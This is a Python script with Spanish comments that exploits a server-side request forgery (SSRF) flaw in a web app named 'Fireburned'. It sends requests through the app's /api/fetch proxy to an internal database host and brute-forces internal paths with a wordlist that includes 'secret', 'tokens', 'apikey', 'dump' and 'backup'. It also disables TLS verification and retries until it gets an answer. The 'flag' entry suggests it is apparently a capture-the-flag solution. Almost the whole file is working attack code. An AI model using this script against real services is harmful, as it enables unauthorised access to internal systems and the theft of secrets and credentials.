#!/usr/bin/env python3
"""Fireburned - fuzzing de rutas del card store interno via SSRF."""
import json
import sys
import time

import requests
import urllib3

urllib3.disable_warnings()

BASE = "https://<host>/fireburned"
H = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
DB = "http://fireburned--db:8080"

WORDS = [
    "welcome", "draft", "drafts", "card", "cards", "welcome-card",
    "notification", "notifications", "alert", "alerts", "message", "messages",
    "template", "templates", "preview", "previews", "webhook", "webhooks",
    "hook", "hooks", "ember", "emberhook", "emberhook-cards", "fireburned",
    "fire", "burn", "flag", "secret", "admin", "internal", "config",
    "settings", "default", "demo", "test", "sample", "example", "invoice",
    "receipt", "digest", "newsletter", "otp", "reset", "invite", "verify",
    "onboarding", "status", "health", "metrics", "users", "user", "team",
    "teams", "org", "tenant", "tenants", "docs", "documents", "doc", "store",
    "db", "data", "kv", "cache", "export", "dump", "backup", "list", "all",
    "index", "home", "api", "v1", "v2", "cardstore", "card-store", "inbox",
    "outbox", "queue", "jobs", "tasks", "events", "logs", "audit", "token",
    "tokens", "keys", "apikey", "api-key", "private", "public", "sandbox",
]


def fetch(path, method="GET", body=None, tries=40):
    p = {"url": DB + path, "method": method}
    if body is not None:
        p["body"] = body
    for _ in range(tries):
        try:
            r = requests.post(BASE + "/api/fetch", data=json.dumps(p),
                              headers=H, timeout=12, verify=False)
            if r.status_code in (502, 503, 504):
                time.sleep(0.25)
                continue
            return r
        except Exception:
            time.sleep(0.25)
    return None


def status_of(r):
    if r is None:
        return None, None
    try:
        j = r.json()
        return j.get("upstream_status"), j.get("body")
    except Exception:
        return r.status_code, r.text[:200]


if __name__ == "__main__":
    prefixes = sys.argv[1].split(",") if len(sys.argv) > 1 else [""]
    words = sys.argv[2].split(",") if len(sys.argv) > 2 else WORDS
    for pre in prefixes:
        for w in words:
            path = f"{pre}/{w}"
            st, body = status_of(fetch(path))
            if st not in (404, None):
                print(f"{path:40} -> {st} {json.dumps(body)[:220]}", flush=True)
            elif st is None:
                print(f"{path:40} -> SIN RESPUESTA", flush=True)
    print("fin")
